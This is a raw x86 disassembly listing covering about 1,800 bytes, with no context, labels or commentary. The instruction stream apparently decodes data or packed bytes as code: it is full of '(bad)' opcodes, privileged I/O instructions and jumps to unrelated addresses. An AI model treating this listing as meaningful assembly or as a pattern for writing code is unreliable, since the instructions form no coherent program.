  4b3ac8:	and    DWORD PTR [edx+0x66],0x203e00d9
  4b3acf:	fcmovb st,st(0)
  4b3ad1:	cmc    
  4b3ad2:	and    BYTE PTR [eax],al
  4b3ad4:	xor    DWORD PTR [ebx+0x35488bdf],0x9e84c596
  4b3ade:	or     al,0x31
  4b3ae0:	test   ah,0x36
  4b3ae3:	pusha  
  4b3ae4:	or     BYTE PTR [ecx-0x15],dh
  4b3ae7:	or     cl,BYTE PTR [ecx]
  4b3ae9:	pop    ss
  4b3aea:	mov    al,ds:0x11af084
  4b3aef:	retf   0xd0ca
  4b3af2:	(bad)  
  4b3af4:	push   es
  4b3af5:	pop    esi
  4b3af6:	retf   
  4b3af7:	cmp    bl,dl
  4b3af9:	inc    eax
  4b3afa:	outs   dx,BYTE PTR ds:[esi]
  4b3afb:	int    0xed
  4b3afd:	mov    al,0xd6
  4b3aff:	cs gs mov bh,0xd5
  4b3b03:	xchg   esi,eax
  4b3b04:	mov    ecx,0x362c9186
  4b3b09:	jne    0x4b3b4b
  4b3b0b:	mov    ah,0x7a
  4b3b0d:	pop    ebx
  4b3b0e:	iret   
  4b3b0f:	ins    BYTE PTR es:[edi],dx
  4b3b10:	in     eax,dx
  4b3b11:	xchg   ebp,eax
  4b3b12:	inc    eax
  4b3b13:	into   
  4b3b14:	ins    DWORD PTR es:[edi],dx
  4b3b15:	xchg   ecx,eax
  4b3b16:	add    BYTE PTR [ecx+0x50188007],dl
  4b3b1c:	(bad)  
  4b3b1d:	test   BYTE PTR [edx+esi*8-0x5b],ah
  4b3b21:	retf   0x69c7
  4b3b24:	outs   dx,BYTE PTR ds:[esi]
  4b3b25:	mov    dl,BYTE PTR [edx]
  4b3b27:	out    0xac,al
  4b3b29:	adc    BYTE PTR [eax+0x11],bl
  4b3b2c:	stos   DWORD PTR es:[edi],eax
  4b3b2d:	or     al,0xef
  4b3b2f:	fdiv   DWORD PTR [edx+0x64]
  4b3b32:	loopne 0x4b3baa
  4b3b34:	fwait
  4b3b35:	add    al,ch
  4b3b37:	add    al,0xe
  4b3b39:	xor    BYTE PTR [eax+esi*4-0x12814b8b],ch
  4b3b40:	mov    ds:0xe9d20b78,al
  4b3b45:	add    al,al
  4b3b47:	imul   eax,DWORD PTR [ebx],0x6a213b81
  4b3b4d:	or     BYTE PTR [ebp+ebp*8+0x14],bh
  4b3b51:	xchg   esi,eax
  4b3b52:	push   cs
  4b3b53:	ins    DWORD PTR es:[edi],dx
  4b3b54:	fcom   QWORD PTR [eax]
  4b3b56:	push   ds
  4b3b57:	das    
  4b3b58:	dec    esi
  4b3b59:	adc    dl,al
  4b3b5b:	outs   dx,BYTE PTR ds:[esi]
  4b3b5c:	out    0x4f,al
  4b3b5e:	js     0x4b3b8d
  4b3b60:	dec    ebp
  4b3b61:	lock loop 0x4b3b71
  4b3b64:	(bad)  
  4b3b65:	and    cl,ch
  4b3b67:	jne    0x4b3bdd
  4b3b69:	adc    BYTE PTR [ecx+ebp*8],ah
  4b3b6c:	mov    esi,0x9684287e
  4b3b71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b3b72:	cld    
  4b3b73:	scas   al,BYTE PTR es:[edi]
  4b3b74:	xor    ebp,DWORD PTR [eax-0x2c86f7f5]
  4b3b7a:	inc    edi
  4b3b7b:	pop    edi
  4b3b7c:	clc    
  4b3b7d:	fwait
  4b3b7e:	and    BYTE PTR [esi+0x307dd823],bh
  4b3b84:	jae    0x4b3b8c
  4b3b86:	sti    
  4b3b87:	sar    BYTE PTR [edx-0x831774f],1
  4b3b8d:	lock lods eax,DWORD PTR ds:[esi]
  4b3b8f:	push   ecx
  4b3b90:	dec    edi
  4b3b91:	push   edi
  4b3b92:	add    edx,DWORD PTR [esi+0x46e4a0d2]
  4b3b98:	nop
  4b3b99:	icebp  
  4b3b9a:	mov    ah,0x34
  4b3b9c:	cld    
  4b3b9d:	imul   eax,DWORD PTR ds:0x6c376b2b,0xd338e87e
  4b3ba7:	mov    al,0x5c
  4b3ba9:	or     edx,DWORD PTR [ebx-0x5]
  4b3bac:	and    ebp,DWORD PTR [ecx-0x27f72663]
  4b3bb2:	xor    eax,0x134e819c
  4b3bb7:	dec    eax
  4b3bb8:	mov    ch,0x9
  4b3bba:	inc    ebp
  4b3bbb:	push   edi
  4b3bbc:	mov    BYTE PTR [edi+ebx*1],dh
  4b3bbf:	mov    cl,0xd
  4b3bc1:	adc    BYTE PTR [ecx+eiz*4],dl
  4b3bc4:	fdiv   QWORD PTR [eax]
  4b3bc6:	add    al,0x56
  4b3bc8:	out    0x5d,eax
  4b3bca:	mov    eax,0xfa8bf092
  4b3bcf:	and    eax,0x24c21ca
  4b3bd4:	pop    eax
  4b3bd5:	xchg   BYTE PTR [esi+0x7c],ah
  4b3bd8:	in     al,0x0
  4b3bda:	mov    dh,0x11
  4b3bdc:	push   ebp
  4b3bdd:	adc    ah,BYTE PTR [esp+ebx*8+0x17]
  4b3be1:	sbb    dl,BYTE PTR [edi-0x14296d70]
  4b3be7:	shl    BYTE PTR [ebp+0xe314ad2],1
  4b3bed:	lea    edi,[eax-0x6cee9e10]
  4b3bf3:	or     al,BYTE PTR [ecx+0x60]
  4b3bf6:	pop    esp
  4b3bf7:	imul   ecx,DWORD PTR [eax+ecx*1],0x38
  4b3bfb:	xchg   esi,eax
  4b3bfc:	xor    eax,0x651c04ff
  4b3c01:	xor    al,0x4d
  4b3c03:	paddd  mm7,mm5
  4b3c06:	ja     0x4b3bb4
  4b3c08:	xchg   esi,eax
  4b3c09:	pusha  
  4b3c0a:	add    al,0x4a
  4b3c0c:	lods   eax,DWORD PTR ds:[esi]
  4b3c0d:	sbb    al,0x76
  4b3c0f:	add    ah,BYTE PTR [ebx-0x64]
  4b3c12:	push   ecx
  4b3c13:	mov    ch,0x17
  4b3c15:	sbb    DWORD PTR [ebp-0x5d9331fc],esi
  4b3c1b:	add    eax,0x4887beef
  4b3c20:	sub    ebp,DWORD PTR [ebx]
  4b3c22:	dec    ebx
  4b3c23:	add    esp,esi
  4b3c25:	push   edi
  4b3c26:	xor    eax,0xe27420
  4b3c2b:	aam    0xb4
  4b3c2d:	or     eax,0xe3480919
  4b3c32:	in     al,dx
  4b3c33:	ins    DWORD PTR es:[edi],dx
  4b3c34:	jmp    0x5420:0x51d4e34b
  4b3c3b:	push   0x75f689b0
  4b3c40:	(bad)  
  4b3c41:	aam    0xcb
  4b3c43:	les    edi,FWORD PTR [edi-0x78f697d7]
  4b3c49:	add    eax,0x2f27baf1
  4b3c4e:	xor    al,0xd8
  4b3c50:	test   eax,0x29140f34
  4b3c55:	cmp    DWORD PTR [ecx],edi
  4b3c57:	xchg   edx,eax
  4b3c58:	popa   
  4b3c59:	(bad)  
  4b3c5a:	sbb    al,0x71
  4b3c5c:	dec    ebp
  4b3c5d:	inc    eax
  4b3c5e:	xchg   ecx,eax
  4b3c5f:	std    
  4b3c60:	lock aam 0x66
  4b3c63:	imul   edi,DWORD PTR [ebp+0x15],0x7b753013
  4b3c6a:	lods   eax,DWORD PTR ds:[esi]
  4b3c6b:	pop    ds
  4b3c6c:	xchg   edx,eax
  4b3c6d:	rol    bl,0x1e
  4b3c70:	js     0x4b3ce6
  4b3c72:	or     edx,DWORD PTR ds:0x2607558
  4b3c78:	or     ebx,DWORD PTR [eax]
  4b3c7a:	call   0x78d311d4
  4b3c7f:	bound  edx,QWORD PTR [edi+0x14f89632]
  4b3c85:	pop    esi
  4b3c86:	(bad)  
  4b3c87:	lea    edi,[ebx+0x9]
  4b3c8a:	loope  0x4b3c9b
  4b3c8c:	push   esi
  4b3c8d:	push   0x7c4dec24
  4b3c92:	mov    esp,0xdebc690
  4b3c97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b3c98:	push   ecx
  4b3c99:	pop    edi
  4b3c9a:	enter  0xa386,0x1
  4b3c9e:	scas   eax,DWORD PTR es:[edi]
  4b3c9f:	add    esi,DWORD PTR ds:0xaf610cc3
  4b3ca5:	gs daa 
  4b3ca7:	pop    ebp
  4b3ca8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b3ca9:	sbb    eax,0x417a55df
  4b3cae:	adc    ecx,edx
  4b3cb0:	aam    0x50
  4b3cb2:	jmp    0xa9ddb941
  4b3cb7:	pop    ebp
  4b3cb8:	or     eax,ebx
  4b3cba:	hlt    
  4b3cbb:	jg     0x4b3c47
  4b3cbd:	in     eax,dx
  4b3cbe:	les    ecx,FWORD PTR [ebx+0x29689d14]
  4b3cc4:	in     al,dx
  4b3cc5:	sbb    BYTE PTR [edx],0x28
  4b3cc8:	add    ebx,edx
  4b3cca:	push   es
  4b3ccb:	dec    ebx
  4b3ccc:	sub    edi,0x6
  4b3ccf:	and    ah,BYTE PTR [edx+0x7c]
  4b3cd2:	loop   0x4b3cdc
  4b3cd4:	jne    0x4b3d38
  4b3cd6:	pop    es
  4b3cd7:	(bad)  
  4b3cd8:	retf   
  4b3cd9:	push   eax
  4b3cda:	ror    BYTE PTR [ebx-0x61],0x26
  4b3cde:	xchg   edx,eax
  4b3cdf:	mov    WORD PTR [eax],gs
  4b3ce1:	sbb    ch,al
  4b3ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b3ce4:	retf   
  4b3ce5:	dec    ecx
  4b3ce6:	(bad)  
  4b3ce7:	adc    al,BYTE PTR [ebp+ebx*4+0xd]
  4b3ceb:	jnp    0x4b3ccd
  4b3ced:	or     al,0x43
  4b3cef:	hlt    
  4b3cf0:	test   BYTE PTR [edx+0x2e],0x60
  4b3cf4:	fstp   QWORD PTR [ebx]
  4b3cf6:	jecxz  0x4b3d60
  4b3cf8:	mov    WORD PTR [edx+0x52],ss
  4b3cfb:	and    eax,0x29ae8345
  4b3d00:	shr    BYTE PTR [ecx+0x10],0xf
  4b3d04:	lea    ecx,[ecx-0x3bcd6131]
  4b3d0a:	gs mov ebx,0xd492af0
  4b3d10:	(bad)  
  4b3d11:	push   0x8b09ae62
  4b3d16:	pop    eax
  4b3d17:	sub    ebx,DWORD PTR [edx+edx*4]
  4b3d1a:	or     edx,DWORD PTR [ebx-0x482f5231]
  4b3d20:	jae    0x4b3d50
  4b3d22:	pop    ebx
  4b3d23:	xor    dl,bl
  4b3d25:	mov    dh,BYTE PTR [edx-0x3f2efe2f]
  4b3d2b:	pusha  
  4b3d2c:	imul   ebx,edx,0x24
  4b3d2f:	(bad)  
  4b3d30:	sbb    BYTE PTR [ebx-0x69cc88fc],al
  4b3d36:	jno    0x4b3d2a
  4b3d38:	inc    edi
  4b3d39:	popa   
  4b3d3a:	std    
  4b3d3b:	mov    edx,0xbd80417b
  4b3d40:	xor    DWORD PTR [edi],0xffffff9a
  4b3d43:	dec    eax
  4b3d44:	pushf  
  4b3d45:	cmp    DWORD PTR [eax],edi
  4b3d47:	xchg   DWORD PTR [ecx+0x281eb53b],esi
  4b3d4d:	mov    ebp,esp
  4b3d4f:	cmp    eax,DWORD PTR [eax+0xe34536c]
  4b3d55:	ja     0x208f40c1
  4b3d5b:	xor    dh,BYTE PTR [edx+ebp*2+0x6]
  4b3d5f:	inc    esi
  4b3d60:	pop    esp
  4b3d61:	xor    DWORD PTR [esi],ecx
  4b3d63:	jp     0x4b3cf7
  4b3d65:	shl    BYTE PTR [eax],0xf9
  4b3d68:	sbb    eax,0x45d4178
  4b3d6d:	fnstsw ax
  4b3d6f:	dec    eax
  4b3d70:	out    0x50,eax
  4b3d72:	mov    BYTE PTR [eax+0x1d],0x1
  4b3d76:	dec    ebp
  4b3d77:	sbb    ecx,DWORD PTR [ecx]
  4b3d79:	fisubr WORD PTR [ecx]
  4b3d7b:	xchg   DWORD PTR [ebx-0x7c],ecx
  4b3d7e:	sbb    eax,DWORD PTR [edx+0x6690048]
  4b3d84:	jnp    0x4b3dff
  4b3d86:	add    eax,0x6ad3b6b3
  4b3d8b:	or     eax,0x4107b9c7
  4b3d90:	cmp    ebp,DWORD PTR [edx-0x6816fe12]
  4b3d96:	xchg   ecx,eax
  4b3d97:	push   ss
  4b3d98:	push   es
  4b3d99:	mov    bl,0x12
  4b3d9b:	or     edi,edi
  4b3d9d:	mov    edi,0xf0329369
  4b3da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b3da3:	(bad)  [edi]
  4b3da5:	aaa    
  4b3da6:	js     0x4b3ddf
  4b3da8:	cmp    BYTE PTR [edx+ecx*2],bh
  4b3dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b3dac:	and    DWORD PTR ds:0xb146c656,0xffffffe5
  4b3db3:	mov    cl,0x25
  4b3db5:	push   ebp
  4b3db6:	test   BYTE PTR [esi-0x7eb4e527],cl
  4b3dbc:	mov    ecx,0x562e5267
  4b3dc1:	pop    es
  4b3dc2:	and    edi,DWORD PTR [eax+0x117aa30f]
  4b3dc8:	mov    BYTE PTR [edi+eax*1-0x12],dh
  4b3dcc:	mov    esp,0x1a8c1d82
  4b3dd1:	enter  0x6f54,0xd8
  4b3dd5:	sbb    bl,BYTE PTR [esi+esi*8+0x37]
  4b3dd9:	and    al,0x6a
  4b3ddb:	inc    ebp
  4b3ddc:	test   BYTE PTR [ecx],dh
  4b3dde:	add    bh,BYTE PTR [ebp+0x42]
  4b3de1:	sahf   
  4b3de2:	or     esp,esp
  4b3de4:	sbb    eax,0x1ba1a2d3
  4b3de9:	add    bh,BYTE PTR [esi+0x1b49921b]
  4b3def:	sbb    BYTE PTR [edx+eiz*4-0x21],al
  4b3df3:	add    DWORD PTR [edx+0x78],esp
  4b3df6:	xchg   ebx,eax
  4b3df7:	inc    ecx
  4b3df8:	sbb    esp,DWORD PTR [ecx+0x7]
  4b3dfb:	aaa    
  4b3dfc:	jbe    0x4b3d86
  4b3dfe:	out    0x1a,eax
  4b3e00:	mov    ch,0x58
  4b3e02:	adc    ch,dl
  4b3e04:	dec    ebp
  4b3e05:	jb     0x4b3ddf
  4b3e07:	xchg   edx,eax
  4b3e08:	pop    es
  4b3e09:	push   es
  4b3e0a:	sbb    dl,BYTE PTR [ebp-0x7c]
  4b3e0d:	mov    dh,BYTE PTR [edi+0x5dc306e1]
  4b3e13:	push   edx
  4b3e14:	pop    es
  4b3e15:	mov    eax,ds:0xcf2a1837
  4b3e1a:	sbb    al,0x64
  4b3e1c:	adc    DWORD PTR [ebx-0x60],edx
  4b3e1f:	pusha  
  4b3e20:	retf   
  4b3e21:	pop    ss
  4b3e22:	xchg   edx,eax
  4b3e23:	sbb    al,0x54
  4b3e25:	test   BYTE PTR [ecx],bh
  4b3e27:	not    DWORD PTR [esi+ebx*4-0x7f]
  4b3e2b:	fst    QWORD PTR [edx-0x5f]
  4b3e2e:	push   ds
  4b3e2f:	adc    ebx,DWORD PTR [ebx-0x4]
  4b3e32:	inc    edx
  4b3e33:	xor    dl,BYTE PTR [ebx+ecx*2+0x1e]
  4b3e37:	push   esp
  4b3e38:	test   al,ch
  4b3e3a:	add    BYTE PTR [eax],bl
  4b3e3c:	fadd   DWORD PTR [ecx+esi*4+0x4b]
  4b3e40:	push   ds
  4b3e41:	mov    eax,ds:0xf243241f
  4b3e46:	cmp    al,0xe4
  4b3e48:	ret    0x5c00
  4b3e4b:	pop    ds
  4b3e4c:	mov    ecx,0x542f9608
  4b3e51:	test   BYTE PTR [edi-0x1acde01b],dl
  4b3e57:	xchg   esp,eax
  4b3e58:	mov    ch,0xeb
  4b3e5a:	jl     0x4b3ded
  4b3e5c:	ss jp  0x4b3e94
  4b3e5f:	xchg   BYTE PTR [ecx+0x78],ch
  4b3e62:	clc    
  4b3e63:	cs inc esi
  4b3e65:	jmp    0x4b3ed1
  4b3e67:	mov    ebx,0x53c97a38
  4b3e6c:	adc    eax,0xffb353a9
  4b3e71:	fisub  DWORD PTR [eax]
  4b3e73:	rol    BYTE PTR [ebx+0x70],0x24
  4b3e77:	adc    eax,0xc280108a
  4b3e7c:	inc    ecx
  4b3e7d:	jo     0x4b3e23
  4b3e7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b3e80:	xor    ah,bl
  4b3e82:	sbb    eax,0xc5fb11e0
  4b3e87:	push   ebx
  4b3e88:	push   ecx
  4b3e89:	inc    edi
  4b3e8a:	jmp    0x4b3e5a
  4b3e8c:	popf   
  4b3e8d:	mov    bl,0x76
  4b3e8f:	add    eax,0xf45849ac
  4b3e94:	outs   dx,DWORD PTR ds:[esi]
  4b3e95:	ins    BYTE PTR es:[edi],dx
  4b3e96:	fwait
  4b3e97:	pop    esi
  4b3e98:	mov    eax,ds:0xfc04dda5
  4b3e9d:	or     BYTE PTR ds:0xde038806,al
  4b3ea3:	repz (bad) 
  4b3ea6:	mov    bl,0x8c
  4b3ea8:	push   ds
  4b3ea9:	mov    bh,0x26
  4b3eab:	cs pop ecx
  4b3ead:	push   es
  4b3eae:	jg     0x4b3ee4
  4b3eb0:	fwait
  4b3eb1:	iret   
  4b3eb2:	repz push cs
  4b3eb4:	stos   BYTE PTR es:[edi],al
  4b3eb5:	int    0x53
  4b3eb7:	add    ebp,edi
  4b3eb9:	add    bl,cl
  4b3ebb:	sar    DWORD PTR [eax+0x462bf71b],1
  4b3ec1:	leave  
  4b3ec2:	sub    al,0xa5
  4b3ec4:	sbb    dh,BYTE PTR es:[edi]
  4b3ec7:	mov    DWORD PTR [edi-0x75],edx
  4b3eca:	add    eax,eax
  4b3ecc:	xchg   ebp,eax
  4b3ecd:	imul   edx,DWORD PTR [esp+ebx*2+0x63],0x2b2671a2
  4b3ed5:	jne    0x4b3efa
  4b3ed7:	xchg   ecx,eax
  4b3ed8:	sbb    bl,dh
  4b3eda:	adc    BYTE PTR [ecx],al
  4b3edc:	mov    esp,0xc4143469
  4b3ee1:	es xchg ebp,eax
  4b3ee3:	push   0xffffffce
  4b3ee5:	test   eax,0xf8974f07
  4b3eea:	inc    edi
  4b3eeb:	inc    eax
  4b3eec:	cmp    eax,0xe13ebc03
  4b3ef1:	and    eax,0x65d0d497
  4b3ef6:	mov    DWORD PTR [ebx+0x5],edi
  4b3ef9:	loop   0x4b3e80
  4b3efb:	out    0x3b,al
  4b3efd:	ret    
  4b3efe:	xor    DWORD PTR [edi-0x2e],eax
  4b3f01:	pushf  
  4b3f02:	push   0xb9de2498
  4b3f07:	lahf   
  4b3f08:	push   es
  4b3f09:	xor    eax,0xc08c8c94
  4b3f0e:	xchg   ebx,eax
  4b3f0f:	cmp    BYTE PTR [esi+0x7670dfa9],dh
  4b3f15:	cwde   
  4b3f16:	(bad)  
  4b3f17:	cmp    eax,0x81ea877
  4b3f1c:	inc    esi
  4b3f1d:	push   es
  4b3f1e:	or     al,0xd3
  4b3f20:	xor    al,0x4d
  4b3f22:	mov    ebx,0xb8eb0178
  4b3f27:	or     dl,BYTE PTR [esi]
  4b3f29:	mov    dl,0x17
  4b3f2b:	lods   al,BYTE PTR ds:[esi]
  4b3f2c:	xchg   edx,eax
  4b3f2d:	fisub  WORD PTR [edx]
  4b3f2f:	dec    esp
  4b3f30:	sbb    BYTE PTR [eax+eiz*2+0x26],bl
  4b3f34:	sbb    al,0xa9
  4b3f36:	ret    0x6a10
  4b3f39:	jge    0x4b3f56
  4b3f3b:	jne    0x4b3f91
  4b3f3d:	xor    al,0x1e
  4b3f3f:	dec    esp
  4b3f40:	push   0x242c577b
  4b3f45:	mov    esi,0x6f7d008
  4b3f4a:	cmp    DWORD PTR [eax],edi
  4b3f4c:	je     0x4b3f59
  4b3f4e:	outs   dx,DWORD PTR ds:[esi]
  4b3f4f:	in     al,dx
  4b3f50:	cmp    al,0x9
  4b3f52:	popf   
  4b3f53:	cmp    eax,esi
  4b3f55:	sbb    cl,BYTE PTR [edx+0x604066a4]
  4b3f5b:	inc    ecx
  4b3f5c:	imul   eax,DWORD PTR cs:[ebp-0x3d],0x43
  4b3f61:	cmp    eax,DWORD PTR ds:0xd1531875
  4b3f67:	js     0x4b3f02
  4b3f69:	dec    eax
  4b3f6a:	leave  
  4b3f6b:	(bad)  
  4b3f6c:	xor    BYTE PTR [ebx-0x7],ch
  4b3f6f:	push   eax
  4b3f70:	retf   
  4b3f71:	dec    esi
  4b3f72:	and    BYTE PTR [ebx+0x51],dl
  4b3f75:	pop    ds
  4b3f76:	pop    esi
  4b3f77:	rol    edi,0xa4
  4b3f7a:	mov    edi,edi
  4b3f7c:	pop    eax
  4b3f7d:	pop    es
  4b3f7e:	jp     0x4b3fde
  4b3f80:	push   es
  4b3f81:	dec    esp
  4b3f82:	fstp   DWORD PTR [edi+0x645279e7]
  4b3f88:	mov    ah,0x0
  4b3f8a:	add    eax,0x6010501
  4b3f8f:	ficom  DWORD PTR [ecx-0x38]
  4b3f92:	add    al,BYTE PTR ds:0xe043903
  4b3f98:	xor    al,0x79
  4b3f9a:	adc    al,0x82
  4b3f9c:	push   eax
  4b3f9d:	mov    eax,ds:0x10d2f3ad
  4b3fa2:	(bad)  
  4b3fa3:	mov    WORD PTR [ecx],es
  4b3fa5:	out    0xa2,al
  4b3fa7:	xor    DWORD PTR [eax],esp
  4b3fa9:	ins    BYTE PTR es:[edi],dx
  4b3faa:	fbstp  TBYTE PTR [ebx+eiz*4-0x4bbfc6b0]
  4b3fb1:	mov    eax,0xa3ec5b33
  4b3fb6:	xor    BYTE PTR [ebx*2-0x1abfb2b0],cl
  4b3fbd:	sbb    eax,0x53c84b85
  4b3fc2:	arpl   WORD PTR [ebx-0x77],dx
  4b3fc5:	inc    ebp
  4b3fc6:	or     BYTE PTR ds:0xf0f90b00,ch
  4b3fcc:	push   ebx
  4b3fcd:	mov    DWORD PTR [ebp+0x41],esi
  4b3fd0:	jp     0x4b3fa3
  4b3fd2:	clc    
  4b3fd3:	adc    BYTE PTR [ecx],dl
  4b3fd5:	push   esi
  4b3fd6:	jecxz  0x4b402f
  4b3fd8:	mov    ds:0x16d0dce0,eax
  4b3fdd:	push   ebx
  4b3fde:	push   0xffffffd5
  4b3fe0:	imul   eax,DWORD PTR [ebp+0x52a43901],0xffffffb4
  4b3fe7:	or     ah,ah
  4b3fe9:	inc    edx
  4b3fea:	xchg   BYTE PTR [eax],bl
  4b3fec:	arpl   ax,bx
  4b3fee:	fadd   DWORD PTR [ebp+0x457909b0]
  4b3ff4:	fcom   DWORD PTR [eax-0x28]
  4b3ff7:	gs fs inc edx
  4b3ffa:	cs cwde 
  4b3ffc:	or     DWORD PTR [eax+ecx*8],0xb
  4b4000:	push   edi
  4b4001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b4002:	xchg   ecx,eax
  4b4003:	jl     0x4b4005
  4b4005:	dec    ebp
  4b4006:	jb     0x4b3f98
  4b4008:	aas    
  4b4009:	jp     0x4b3fe3
  4b400b:	mov    ecx,DWORD PTR [ebp-0x38]
  4b400e:	and    al,0x57
  4b4010:	adc    eax,0xa61a43e4
  4b4015:	cmp    BYTE PTR [eax-0x37aeaf2b],bh
  4b401b:	inc    esp
  4b401c:	sub    ah,bl
  4b401e:	fisubr WORD PTR [edi+0x180364c8]
  4b4024:	enter  0x28b8,0x14
  4b4028:	mov    ebp,ss
  4b402a:	jno    0x4b4009
  4b402c:	add    BYTE PTR [ebx],ch
  4b402e:	sub    al,0xe8
  4b4030:	push   cs
  4b4031:	pop    ecx
  4b4032:	mov    dl,0x1
  4b4034:	int3   
  4b4035:	dec    ecx
  4b4036:	xchg   edi,eax
  4b4037:	leave  
  4b4038:	xor    BYTE PTR ss:[edi+0x6d8b8b6a],0x34
  4b4040:	inc    esi
  4b4041:	dec    ebp
  4b4042:	xchg   ecx,eax
  4b4043:	mov    edi,0x6a434b40
  4b4048:	in     eax,0xb8
  4b404a:	in     al,dx
  4b404b:	xchg   edi,eax
  4b404c:	(bad)  
  4b404d:	xor    esi,DWORD PTR [ebp+0x6e015870]
  4b4053:	push   ds
  4b4054:	cmp    ebx,DWORD PTR [edi+0x4]
  4b4057:	jge    0xa3464961
  4b405d:	mov    WORD PTR [ebx],fs
  4b405f:	mov    ah,0xad
  4b4061:	push   cs
  4b4062:	retf   
  4b4063:	fsubr  DWORD PTR [edi+0x703143ec]
  4b4069:	aaa    
  4b406a:	nop
  4b406b:	jmp    0xe502b8e
  4b4070:	xor    edx,DWORD PTR [edx]
  4b4072:	jp     0x4b4038
  4b4074:	ret    
  4b4075:	jns    0x4b4041
  4b4077:	push   es
  4b4078:	dec    ebx
  4b4079:	or     eax,ebp
  4b407b:	outs   dx,BYTE PTR ds:[esi]
  4b407c:	fiadd  DWORD PTR [edi+0x4]
  4b407f:	jge    0x4b40af
  4b4081:	inc    ecx
  4b4082:	mov    WORD PTR [ebx],ss
  4b4084:	js     0x4b40aa
  4b4086:	cmp    eax,0xbbb013f6
  4b408b:	jecxz  0x4b40b0
  4b408d:	inc    edx
  4b408e:	push   ds
  4b408f:	push   edi
  4b4090:	mov    bl,0x7e
  4b4092:	hlt    
  4b4093:	cdq    
  4b4094:	mov    bl,0xb1
  4b4096:	push   cs
  4b4097:	aas    
  4b4098:	jnp    0x4b40ba
  4b409a:	sbb    al,0x76
  4b409c:	jl     0x4b4062
  4b409e:	or     al,BYTE PTR [edi-0x77]
  4b40a1:	adc    esp,DWORD PTR [esi]
  4b40a3:	dec    ebp
  4b40a4:	or     al,0x36
  4b40a6:	xchg   edx,eax
  4b40a7:	and    DWORD PTR [edx-0x58],0x8b173931
  4b40ae:	add    al,0x9f
  4b40b0:	or     BYTE PTR ds:0x1724742b,0x7d
  4b40b7:	jne    0x4b40d0
  4b40b9:	inc    ebx
  4b40ba:	push   cs
  4b40bb:	nop
  4b40bc:	stos   BYTE PTR es:[edi],al
  4b40bd:	jecxz  0x4b4041
  4b40bf:	dec    ebp
  4b40c0:	or     al,0xd
  4b40c2:	and    eax,esp
  4b40c4:	push   ebp
  4b40c5:	mov    ebp,0x3116a628
  4b40ca:	mov    ebx,0xf1add15
  4b40cf:	sub    eax,DWORD PTR [esi]
  4b40d1:	sbb    ebp,DWORD PTR [esi]
  4b40d3:	sub    esi,ecx
  4b40d5:	inc    ecx
  4b40d6:	add    al,0x68
  4b40d8:	repz add eax,0x8529a431
  4b40de:	jmp    0x4b4067
  4b40e0:	mov    esp,0xbee4284e
  4b40e5:	adc    al,0x0
  4b40e7:	adc    BYTE PTR [eax],bl
  4b40e9:	aaa    
  4b40ea:	(bad)  
  4b40eb:	es xor ebp,eax
  4b40ee:	or     eax,DWORD PTR es:[esi-0x6c]
  4b40f2:	retf   0xd406
  4b40f5:	adc    al,0x51
  4b40f7:	adc    ebp,DWORD PTR fs:[ecx+0x34]
  4b40fb:	mov    cl,0x89
  4b40fd:	xor    eax,edx
  4b40ff:	pop    eax
  4b4100:	out    dx,eax
  4b4101:	fisttp QWORD PTR [ecx]
  4b4103:	xor    BYTE PTR [esi],ch
  4b4105:	ss stos DWORD PTR es:[edi],eax
  4b4107:	imul   edx,DWORD PTR [ebx+0x4a],0xc599c6
  4b410e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b410f:	not    BYTE PTR [ebx]
  4b4111:	into   
  4b4112:	add    DWORD PTR [esp+eax*8+0x74],edi
  4b4116:	sbb    esp,eax
  4b4118:	sub    DWORD PTR [ebp+0x4c],esp
  4b411b:	dec    esi
  4b411c:	inc    esp
  4b411d:	pop    ebx
  4b411e:	fsub   DWORD PTR ds:0xbe32df19
  4b4124:	mov    eax,ds:0x5042f79f
  4b4129:	push   ebx
  4b412a:	add    BYTE PTR [eax+0x72d4450a],ah
  4b4130:	in     al,0x8
  4b4132:	fadd   QWORD PTR [ebx-0x6272e7ad]
  4b4138:	ins    DWORD PTR es:[edi],dx
  4b4139:	sbb    eax,DWORD PTR [ecx]
  4b413b:	mov    eax,0x5be24453
  4b4140:	mov    ebp,0x8d660c7d
  4b4145:	sbb    eax,0x75213f05
  4b414a:	sbb    edx,DWORD PTR [ebx+0x7f]
  4b414d:	add    esp,DWORD PTR [ebx-0x7c]
  4b4150:	lods   eax,DWORD PTR ds:[esi]
  4b4151:	ror    BYTE PTR [ecx+edx*8-0x53],0xe5
  4b4156:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b4157:	lods   eax,DWORD PTR ds:[esi]
  4b4158:	test   DWORD PTR [esi],0x6d804434
  4b415e:	scas   eax,DWORD PTR es:[edi]
  4b415f:	add    edi,DWORD PTR [ebx+0x24948520]
  4b4165:	mov    DWORD PTR [eax-0x23d6fe10],0x101b376f
  4b416f:	je     0x4b4125
  4b4171:	sbb    eax,0x5a6b62dd
  4b4176:	mov    bl,0x27
  4b4178:	or     eax,0x458085a
  4b417d:	adc    al,0x10
  4b417f:	lock in eax,dx
  4b4181:	mov    ecx,0x403893b
  4b4186:	or     eax,0xd442867
  4b418b:	cmp    eax,0x190f7aca
  4b4190:	adc    al,0x43
  4b4193:	sub    edi,ebp
  4b4195:	push   0xa7a8c860
  4b419a:	pop    es
  4b419b:	lea    edi,[esi+0xc]
  4b419e:	xor    BYTE PTR [esi+edx*8+0x2496e80d],0x7
  4b41a6:	xchg   esp,eax
  4b41a7:	sub    BYTE PTR [eax+esi*1],al
  4b41aa:	mov    esi,0x34d077c4
  4b41af:	push   cs
  4b41b0:	cmp    al,0xca
  4b41b2:	cmp    edx,eax
  4b41b4:	jne    0x4b41f1
  4b41b6:	fdivr  DWORD PTR [ebx+0xed3a830]
  4b41bc:	xchg   dl,dl
  4b41be:	enter  0xc814,0x4a
  4b41c2:	adc    cl,BYTE PTR [esi+0x7b]
  4b41c5:	xchg   edi,eax
  4b41c6:	or     cl,BYTE PTR [ecx-0x18]
  4b41c9:	sub    edi,ebp
  4b41cb:	add    DWORD PTR [ecx+0x41b61242],edx
  4b41d1:	push   cs
